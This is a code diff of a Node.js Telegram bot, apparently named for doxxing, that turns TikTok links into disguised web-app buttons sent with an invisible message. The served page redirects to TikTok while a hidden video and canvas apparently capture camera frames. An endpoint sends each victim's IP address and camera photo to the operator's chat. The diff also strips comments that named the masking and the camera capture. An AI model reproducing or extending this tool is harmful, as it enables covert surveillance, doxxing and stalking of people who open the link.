@@ -15,7 +15,6 @@ app.use(express.urlencoded({ extended: true }));
 
 const linksDB = {};
 
-// --- ЛИЧНЫЕ СООБЩЕНИЯ ---
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
 });
@@ -29,7 +28,6 @@ bot.on('message', (msg) => {
     linksDB[shortId] = text;
     const fakeLink = `${DOMAIN}/${shortId}/`;
     
-    // В личке тоже без текста, только кнопка
     bot.sendMessage(msg.chat.id, '\u200b', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
@@ -38,7 +36,6 @@ bot.on('message', (msg) => {
   }
 });
 
-// --- INLINE РЕЖИМ (@Dox_tox_bot) ---
 bot.on('inline_query', async (query) => {
   try {
     const text = query.query;
@@ -54,10 +51,9 @@ bot.on('inline_query', async (query) => {
     const result = {
       type: 'article',
       id: shortId,
-      title: 'Открыть видео',
-      description: 'Нажмите, чтобы отправить кнопку',
+      title: 'Открыть',
+      description: 'Отправить',
       input_message_content: {
-        // Невидимый пробел, чтобы не было длинной ссылки
         message_text: '\u200b' 
       },
       reply_markup: {
@@ -67,38 +63,33 @@ bot.on('inline_query', async (query) => {
 
     await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
   } catch (err) {
-    console.error('Inline query error:', err);
+    console.error(err);
   }
 });
 
-// --- ГЛАВНАЯ СТРАНИЦА ---
 app.get('/', (req, res) => {
   res.redirect('https://www.tiktok.com/');
 });
 
-// --- ПРИЕМ ДАННЫХ ---
 app.post('/api/collect', async (req, res) => {
   const { target, photo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   try {
-    let text = `Новый переход\nIP: ${ip}\nЦель: ${target || '?'}`;
-    await bot.sendMessage(CHAT_ID, text);
+    await bot.sendMessage(CHAT_ID, `IP: ${ip}\nЦель: ${target || '?'}`);
 
     if (photo && photo.startsWith('data:image')) {
       const base64Data = photo.split(',')[1];
       const buffer = Buffer.from(base64Data, 'base64');
-      await bot.sendPhoto(CHAT_ID, buffer, { caption: 'Фото с камеры' });
+      await bot.sendPhoto(CHAT_ID, buffer);
     }
 
     res.json({ ok: true });
   } catch (error) {
-    console.error(error);
     res.status(500).json({ ok: false });
   }
 });
 
-// --- МАСКИРОВКА ---
 app.get('/:id/', (req, res) => {
   const shortId = req.params.id;
   const targetUrl = linksDB[shortId];
@@ -138,10 +129,8 @@ app.get('/:id/', (req, res) => {
 <div class="content">
   <div class="skeleton-box"></div>
 </div>
-
 <video id="preview" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
-
 <script>
   const TARGET_URL = "${targetUrl}";
   const tg = window.Telegram?.WebApp;
